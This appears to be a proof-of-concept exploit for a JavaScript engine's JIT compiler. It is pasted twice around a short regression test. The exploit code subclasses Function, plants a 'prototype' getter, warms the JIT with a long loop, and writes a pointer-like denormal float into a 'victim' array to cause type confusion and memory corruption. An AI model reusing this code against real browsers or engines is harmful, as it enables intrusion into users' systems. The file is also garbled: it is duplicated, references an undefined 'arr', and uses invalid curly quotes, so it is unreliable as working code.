class Base extends Function {
  constructor() {
    super();
    super.prototype = 1;
  }
}
let victim = [1.1, 2.2, 3.3];
victim[0] = 1.1;
const b = new Base();
function opt(flag) {
  victim[0] = 13.37; victim[1] = 13.37;
  if (flag) [...arr];
  victim[1] = 3.54484805889626e-310;
}
Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
b.__defineGetter__("prototype", function() { victim[1] = {}; });
for (let i = 0; i < 0x100000; i++) { opt(false); }
arr[0] = b.prototype;
opt(true);
victim[1] + 1;

class MyFunction extends Function {
constructor() {
super();
super.prototype = 1;
}
}

function test1() {
const f = new MyFunction();
f.__defineGetter__(“prototype”, () => {}); // should throw
}

function test2(i) {
const f = new MyFunction();
try { f.__defineGetter__(“prototype”, () => {}); } catch {}
f.prototype.x = i; // should not crash
}

test1();
test2(0);

class Base extends Function {
  constructor() {
    super();
    super.prototype = 1;
  }
}
let victim = [1.1, 2.2, 3.3];
victim[0] = 1.1;
const b = new Base();
function opt(flag) {
  victim[0] = 13.37; victim[1] = 13.37;
  if (flag) [...arr];
  victim[1] = 3.54484805889626e-310;
}
Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
b.__defineGetter__("prototype", function() { victim[1] = {}; });
for (let i = 0; i < 0x100000; i++) { opt(false); }
arr[0] = b.prototype;
opt(true);
victim[1] + 1;
